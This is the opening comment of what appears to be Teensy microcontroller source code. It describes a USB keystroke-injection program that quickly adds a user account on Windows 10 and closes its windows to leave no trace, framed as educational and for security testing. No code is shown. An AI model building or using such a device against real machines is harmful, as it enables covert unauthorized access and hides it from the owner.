 /* This application is developed and tested on the Teensy 3.6 microcontroller, on Windows 10, under "Serial + Keyboard + Mouse + Joystick" usb type.
  * Its purpose is to add an user in a short time. It can be used with various purposes including security tests. After user-adding procces is finished, it leaves no traces of its actions(ex. it closes the windows it used).
  * This application is for educational purpose and it acts like an example of Teensy usage.
